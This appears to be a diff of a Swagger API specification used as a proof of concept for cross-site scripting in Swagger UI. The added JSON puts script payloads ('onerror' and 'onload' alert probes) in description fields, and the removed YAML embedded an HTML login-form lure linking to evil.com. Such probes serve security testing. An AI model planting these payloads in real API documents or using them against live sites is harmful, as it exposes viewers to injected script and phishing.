@@ -1,19 +1,28 @@
-swagger: '2.0'
-info:
-  version: 1.0.0
-  title: Xgoon Hacker
-  description: '<div class="login-form">
-    <div class="heading">
-        <h1>Xgoon Hacker</h1>
-    </div>
-    <div class="form-container">
-        <h1>Click Here</h1>
-        <h1>Mahmoud Kroush <a href="https://evil.com">Click here</a></h1>
-    </div>
-</div>'
-paths:
-  /:
-    post:
-      responses:
-        '200':
-          description: Login successful
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "Swagger PoC",
+    "description": "<img src=x onerror=alert(1)>"
+  },
+  "paths": {
+    "/poc": {
+      "get": {
+        "summary": "XSS via Swagger",
+        "parameters": [
+          {
+            "name": "test",
+            "in": "query",
+            "description": "<svg/onload=alert(1)>",
+            "required": false,
+            "type": "string"
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "ok"
+          }
+        }
+      }
+    }
+  }
+}
